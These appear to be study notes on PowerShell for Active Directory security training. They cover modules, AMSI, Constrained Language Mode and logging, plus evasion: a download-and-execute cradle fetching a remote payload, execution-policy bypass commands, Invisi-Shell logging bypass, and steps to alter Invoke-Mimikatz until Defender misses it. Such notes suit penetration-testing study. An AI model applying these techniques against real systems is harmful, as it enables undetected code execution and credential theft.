# PowerShell
- PowerShell is commonly associated with Windows 7 and later versions of the Windows operating system.
- PowerShell is NOT powershell.exe. It is the *System.Management.Automation.dll*
- PowerShell that contains a collection of cmdlets, functions, variables, and other elements that can be reused across multiple scripts or sessions.
- PowerShell Modules are designed to encapsulate and organize specific pieces of functionality in a modular and efficient way.
- PowerShell Extenstion is .psd1 & .psm1
- ```.psd1```: This extension is used for PowerShell Data files. Specifically, it is commonly used for module manifest files. A module manifest is a metadata file that provides information about a PowerShell module, such as its name, version, author, and dependencies. The .psd1 file is written in a format similar to a hashtable with key-value pairs and is used to define various attributes and settings for the module.
- ```.psm1```: This extension is used for PowerShell Script Module files. These are script files that contain PowerShell code, including functions and cmdlets, that are part of a module. When you create a module, you can include one or more .psm1 files to define the actual functionality provided by the module. These script module files are typically where you write the code for the module's cmdlets and functions.
- what is mean of ```Cradle```?
It is a method used for executing PowerShell commands or scripts in a way that may bypass security measures and avoid writing scripts or payloads to disk.\
**Example:**\
```iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')```
>"iex" stands for "Invoke-Expression." It is a cmdlet that allows you to run a string as a PowerShell expression or script. The iex cmdlet takes a string as its argument and then interprets and executes the code contained within that string.

**Note:**
> - PowerShell is an interpreted scripting language. It uses an interpreter to process and execute PowerShell scripts and commands. When you run a PowerShell script or enter PowerShell commands in an interactive session, the PowerShell interpreter reads and executes the code line by line or statement by statement.
> - PowerShell scripts are not compiled into machine code before execution. Instead, they are directly interpreted by the PowerShell runtime environment. This allows for flexibility, ease of debugging, and interactive development. However, it can also result in somewhat slower execution compared to compiled languages.
   
**Compiler Vs Interpreter:**
 > 1. Processing Approach:\
      - Compiler: Compilers process the entire source code of a program in one go, translating it into machine code or an intermediate representation before execution. The result is an executable file that can be run independently.\
      - Interpreter: Interpreters process the source code line by line or statement by statement, executing it as they encounter each part of the code.
 > 2. Execution:\
      - Compiler: The code is executed after the compilation process is complete. There is no need to recompile the code each time it runs, which generally results in faster execution.\
      - Interpreter: Code is executed directly, and there is no separate compilation step. This can lead to slower execution as the source code is repeatedly analyzed and executed.
 > 3. Debugging:\
      - Compiler: Debugging can be more challenging, as errors are often detected during or after the compilation process, and it may not be immediately obvious where in the source code the problem exists.\
      - Interpreter: Debugging is often more straightforward, as errors are reported as soon as they are encountered in the code, making it easier to identify the specific location of issues.
 > 4. Portability:\
      - Compiler: Code compiled with one compiler on a specific platform may not be directly executable on a different platform without recompilation.\
      - Interpreter: Interpreted code is often more portable, as long as the interpreter is available for the target platform.
 > 5. Flexibility:\
      - Compiler: Compiled code is generally less flexible because it is already translated into machine code or an intermediate form. Modifications require changes to the source code and recompilation.\
      - Interpreter: Interpreted code is more flexible, as it can be modified and executed interactively without the need for a separate compilation step.
- What is ```COM```?\
COM is a technology that allows different software components to communicate with each other on Windows systems. It's particularly useful for interacting with various system and application components, especially in older Windows environments.

- what is ```iwr```?
is an alias for the Invoke-WebRequest cmdlet. This cmdlet is used to send HTTP and HTTPS requests to web servers and retrieve data from websites. It is particularly useful for tasks like downloading files from the internet, interacting with RESTful APIs, and scraping web content.
- What is ```ADSI```?\
ADSI stands for "Active Directory Service Interfaces." It is a set of COM (Component Object Model) interfaces and objects provided by Microsoft for interacting with various directory services, including Microsoft Active Directory and Lightweight Directory Access Protocol (LDAP) directories. ADSI provides a uniform and consistent way to manage and manipulate directory services in Windows environments.
- Who can Interact with AD using PowerShell?
  - ADSI
  - .NET Classes ```System.DirectoriesServices.ActiveDirectory```
  - Native Executable
  - WMI using PowerShell
  - ActiveDirectory module
> .NET is a free, open-source, cross-platform software framework developed by Microsoft. It provides a rich set of tools and libraries for building and running various types of applications, including desktop, web, mobile, cloud, gaming, and IoT (Internet of Things) applications. .NET is designed to be a versatile and unified platform that allows developers to create software for a wide range of devices and operating systems.
- PowerShell detection? 
  - System wide transcription
  - Script Block logging --> event id 4104
  - AntiMalware Scan Interface (AMSI)
  - Constrained Language Mode (CLM) Integrated with Applocker and WDAC (Device Guard)

 what is AMSI?
  - Integration with Scripting Engines: AMSI integrates with scripting engines like PowerShell, VBScript, and JScript. These scripting engines are commonly used by attackers to run malicious code.
  - Content Scanning: When a script or code is executed, the content is passed through the AMSI interface. AMSI scans the content for suspicious or malicious patterns using signatures, heuristics, and other detection methods.
  - Real-time Protection: AMSI provides real-time protection by scanning scripts and code at runtime, allowing security products to detect and block malicious activities as they occur.

  - Notifications to Security Products: If malicious content is detected, AMSI notifies the registered antivirus or security product, which can then take appropriate actions, such as blocking the execution of the script or code.
  -  Support for Third-Party Security Products: AMSI is not limited to Microsoft's own security products. Third-party antivirus and security software can also leverage the AMSI interface to enhance their ability to detect and prevent malware.

what is the mean of Constrained Language Mode (CLM) Integrated with Applocker and WDAC (Device Guard) ?\
Constrained Language Mode (CLM) is a feature in PowerShell designed to restrict the language elements that can be used in a script. This can help mitigate security risks associated with malicious or unintentional use of certain PowerShell features. When CLM is enforced, it limits the use of language elements that could be abused for malicious purposes.

AppLocker and Windows Defender Application Control (WDAC), formerly known as Device Guard, are additional security features in Windows that work in conjunction with PowerShell's CLM to enhance overall system security.

AppLocker:

- Role: AppLocker is a security feature that helps administrators control which applications and scripts users can run on a Windows system.
- Integration: When CLM is combined with AppLocker, PowerShell scripts can be further restricted based on the rules defined in AppLocker policies. AppLocker policies allow administrators to specify which scripts or applications are allowed to run, preventing the execution of unauthorized or potentially malicious scripts.

Windows Defender Application Control (WDAC) - Device Guard:

- Role: WDAC, also known as Device Guard, is a set of features in Windows that controls which applications and scripts are allowed to run by using code integrity policies.
- Integration: CLM works in conjunction with WDAC to provide additional security. WDAC can enforce code integrity policies that specify which scripts and executables are allowed to run based on cryptographic signatures or other criteria. When WDAC is used in combination with CLM, it adds an extra layer of protection against unauthorized or malicious code execution.
By integrating CLM with AppLocker and WDAC, administrators can implement a multi-layered security approach for PowerShell scripts.

CLM: Restricts the language elements within PowerShell scripts.
AppLocker: Controls which scripts and applications are allowed to run based on defined policies.
WDAC (Device Guard): Enforces code integrity policies to ensure that only trusted and authorized scripts and executables are executed.


***Execution Policy***
>It is NOT a security measure, it is present to prevent user from accidently executing scripts.

Several ways to bypass:-
```
powershell –ExecutionPolicy bypass
powershell –c <cmd>
powershell –encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```
> keep this statement on your mind\
> • There are bypasses and then there are obfuscated bypasses!

***Bypassing PowerShell Security***\
• use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for
bypassing the security controls in PowerShell.\
• The tool hooks the .NET assemblies
(System.Management.Automation.dll and System.Core.dll) to bypass
logging\
• It uses a CLR Profiler API to perform the hook.\
• "A common language runtime (CLR) profiler is a dynamic link library
(DLL) that consists of functions that receive messages from, and send
messages to, the CLR by using the profiling API. The profiler DLL is
loaded by the CLR at run time."

***Using Invisi-Shell***\
• With admin privileges:\
```RunWithPathAsAdmin.bat```\
• With non-admin privileges:\
```RunWithRegistryNonAdmin.bat```\
• Type exit from the new PowerShell session to complete the clean-up.

***Bypassing AV Signatures for PowerShell***\
We can always load scripts in memory and avoid detection using AMSI bypass.\
• How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?\
• We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected.\
• Simply provide path to the script file to scan it:\
```AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1```\
• For full obfuscation of PowerShell scripts, see Invoke-Obfuscation\
(https://github.com/danielbohannon/Invoke-Obfuscation).

• Steps to avoid signature based detection are pretty simple:
1) Scan using AMSITrigger
2) Modify the detected code snippet
3) Rescan using AMSITrigger
4) Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or
“Blank”

***Bypassing AV Signatures for PowerShell - Invoke-Mimikatz***\
There are multiple detections. We need to make the following changes:
1) Remove the comments.
2) Modify each use of "DumpCreds".
3) Modify the variable names of the Win32 API calls that are detected.
4) Reverse the strings that are detected and the Mimikatz Compressed
DLL string.

